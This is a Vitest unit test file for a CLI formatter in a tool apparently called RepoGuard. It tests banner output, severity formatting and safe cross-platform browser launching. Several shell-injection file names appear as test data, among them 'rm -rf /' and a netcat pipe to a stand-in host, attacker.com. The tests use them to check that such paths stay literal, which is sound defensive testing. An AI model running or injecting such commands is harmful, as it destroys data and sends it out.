/**
 * RepoGuard — AI-Assisted Code Reliability & Security Platform
 *
 * Path: tests/unit/cli/formatter.test.ts
 * Owner: Team Lead
 * Purpose: Unit tests for CLI terminal formatting, animated banner effects, and secure browser launching
 */

import { describe, it, expect, vi } from 'vitest';
import type { ChildProcess } from 'node:child_process';
import { resolve } from 'node:path';
import {
  getStaticBanner,
  renderStartupEffect,
  formatSeverity,
  formatStep,
  formatSuccess,
  formatWarning,
  formatError,
  formatSummaryTable,
  getOpenCommand,
  openInBrowser,
  toAbsolutePath,
  formatFileUri,
} from '../../../src/cli/formatter.js';

describe('CLI Formatter & Animated Effects', () => {
  it('generates a clean cyber badge in getStaticBanner', () => {
    const banner = getStaticBanner('0.1.0');
    expect(banner).toContain('R E P O G U A R D');
    expect(banner).toContain('v0.1.0');
    expect(banner).toContain('Fix with evidence. Verify before trust.');
  });

  it('renderStartupEffect finishes super-fast (< 250ms) in test environment', async () => {
    const startTime = Date.now();
    await renderStartupEffect({ version: '0.1.0', animated: false });
    const duration = Date.now() - startTime;

    // Must be fast and non-blocking in automated suites
    expect(duration).toBeLessThan(250);
  });

  it('formats severity levels with expected labels', () => {
    expect(formatSeverity('CRITICAL')).toContain('CRITICAL');
    expect(formatSeverity('HIGH')).toContain('HIGH');
    expect(formatSeverity('MEDIUM')).toContain('MEDIUM');
    expect(formatSeverity('LOW')).toContain('LOW');
    expect(formatSeverity('INFO')).toContain('INFO');
  });

  it('formats pipeline step indicators', () => {
    const step = formatStep(1, 4, 'Discovering codebase');
    expect(step).toContain('[1/4]');
    expect(step).toContain('Discovering codebase');
  });

  it('formats success, warning, and error status icons', () => {
    expect(formatSuccess('Done')).toContain('Done');
    expect(formatWarning('Check')).toContain('Check');
    expect(formatError('Failed')).toContain('Failed');
  });

  it('generates a formatted summary table', () => {
    const table = formatSummaryTable({
      critical: 1,
      high: 0,
      medium: 2,
      low: 0,
      info: 5,
    });

    expect(table).toContain('📊 Audit Summary:');
    expect(table).toContain('CRITICAL');
    expect(table).toContain('🚨 Action Required');
    expect(table).toContain('MEDIUM');
    expect(table).toContain('⚡ Review Advised');
  });
});

describe('Browser Launch Safety & Shell Injection Prevention', () => {
  describe('toAbsolutePath path normalization', () => {
    it('recognizes Windows drive paths with backslashes on any host OS', () => {
      expect(toAbsolutePath('C:\\reports\\report.html')).toBe('C:\\reports\\report.html');
      expect(toAbsolutePath('D:\\repoguard\\index.html')).toBe('D:\\repoguard\\index.html');
    });

    it('recognizes Windows drive paths with forward slashes on any host OS', () => {
      expect(toAbsolutePath('C:/reports/report.html')).toBe('C:/reports/report.html');
      expect(toAbsolutePath('d:/workspace/test.html')).toBe('d:/workspace/test.html');
    });

    it('recognizes POSIX absolute paths', () => {
      expect(toAbsolutePath('/Users/pratham/repoguard/report.html')).toBe('/Users/pratham/repoguard/report.html');
      expect(toAbsolutePath('/var/log/report.html')).toBe('/var/log/report.html');
    });

    it('resolves relative paths against process.cwd()', () => {
      const relPath = 'report.html';
      expect(toAbsolutePath(relPath)).toBe(resolve(process.cwd(), relPath));
      expect(toAbsolutePath('./sub/report.html')).toBe(resolve(process.cwd(), './sub/report.html'));
    });

    it('formats file URI correctly for absolute and relative paths', () => {
      expect(formatFileUri('/var/reports/report.html')).toBe('file:///var/reports/report.html');
      expect(formatFileUri('C:\\reports\\report.html')).toBe('file://C:\\reports\\report.html');
      expect(formatFileUri('report.html')).toBe(`file://${resolve(process.cwd(), 'report.html')}`);
    });
  });

  describe('getOpenCommand cross-platform mapping', () => {
    it('uses "open" binary on macOS (darwin)', () => {
      const spec = getOpenCommand('/path/to/report.html', 'darwin');
      expect(spec.command).toBe('open');
      expect(spec.args).toEqual(['/path/to/report.html']);
    });

    it('uses "xdg-open" binary on Linux', () => {
      const spec = getOpenCommand('/path/to/report.html', 'linux');
      expect(spec.command).toBe('xdg-open');
      expect(spec.args).toEqual(['/path/to/report.html']);
    });

    it('uses "cmd.exe" with discrete arguments on Windows (win32)', () => {
      const spec = getOpenCommand('C:\\reports\\report.html', 'win32');
      expect(spec.command).toBe('cmd.exe');
      expect(spec.args).toEqual(['/c', 'start', '""', 'C:\\reports\\report.html']);
    });

    it('uses "cmd.exe" with forward slashes in Windows drive-letter path', () => {
      const spec = getOpenCommand('C:/reports/report.html', 'win32');
      expect(spec.command).toBe('cmd.exe');
      expect(spec.args).toEqual(['/c', 'start', '""', 'C:/reports/report.html']);
    });

    it('resolves relative paths when generating command spec', () => {
      const spec = getOpenCommand('report.html', 'darwin');
      expect(spec.command).toBe('open');
      expect(spec.args).toEqual([resolve(process.cwd(), 'report.html')]);
    });
  });

  describe('Paths with spaces and special characters', () => {
    it('safely preserves file paths containing whitespace as a single argument', () => {
      const pathWithSpaces = '/Users/pratham/my reports/audit run 1.html';
      const specDarwin = getOpenCommand(pathWithSpaces, 'darwin');
      expect(specDarwin.command).toBe('open');
      expect(specDarwin.args).toHaveLength(1);
      expect(specDarwin.args[0]).toBe(pathWithSpaces);

      const specLinux = getOpenCommand(pathWithSpaces, 'linux');
      expect(specLinux.args).toHaveLength(1);
      expect(specLinux.args[0]).toBe(pathWithSpaces);

      const specWindows = getOpenCommand(pathWithSpaces, 'win32');
      expect(specWindows.args[3]).toBe(pathWithSpaces);
    });

    it('safely treats paths containing shell command substitution ($()) as literal strings', () => {
      const maliciousPath = '/tmp/report-$(whoami)-$(id).html';
      const spec = getOpenCommand(maliciousPath, 'darwin');

      expect(spec.command).toBe('open');
      expect(spec.args).toEqual([maliciousPath]);
      // Ensures the path was not sliced or altered
      expect(spec.args[0]).toContain('$(whoami)');
    });

    it('safely treats paths containing semicolons and command chaining as literal strings', () => {
      const maliciousPath = '/var/reports/report; rm -rf /; echo pwned.html';
      const spec = getOpenCommand(maliciousPath, 'linux');

      expect(spec.command).toBe('xdg-open');
      expect(spec.args).toHaveLength(1);
      expect(spec.args[0]).toBe(maliciousPath);
      expect(spec.args[0]).toContain('; rm -rf /;');
    });

    it('safely treats paths containing double quotes and pipes as literal strings', () => {
      const maliciousPath = '/var/reports/report" | nc attacker.com 4444.html';
      const spec = getOpenCommand(maliciousPath, 'darwin');

      expect(spec.command).toBe('open');
      expect(spec.args).toHaveLength(1);
      expect(spec.args[0]).toBe(maliciousPath);
    });
  });

  describe('openInBrowser execution behavior', () => {
    it('launches process with discrete arguments, detached mode, and calls unref()', () => {
      const unrefMock = vi.fn();
      const onMock = vi.fn();
      const spawnSpy = vi.fn().mockReturnValue({
        unref: unrefMock,
        on: onMock,
      } as unknown as ChildProcess);

      const testPath = '/path/to/my report; $(calc).html';
      const child = openInBrowser(testPath, 'darwin', spawnSpy);

      expect(child).toBeDefined();
      expect(spawnSpy).toHaveBeenCalledTimes(1);
      expect(spawnSpy).toHaveBeenCalledWith('open', [testPath], {
        detached: true,
        stdio: 'ignore',
      });
      expect(unrefMock).toHaveBeenCalledTimes(1);
      expect(onMock).toHaveBeenCalledWith('error', expect.any(Function));
    });

    it('gracefully handles spawn errors without throwing or crashing the CLI', () => {
      const throwingSpawn = vi.fn().mockImplementation(() => {
        throw new Error('ENOENT: binary not found');
      });

      expect(() => {
        const result = openInBrowser('/any/path.html', 'linux', throwingSpawn);
        expect(result).toBeUndefined();
      }).not.toThrow();
    });
  });
});
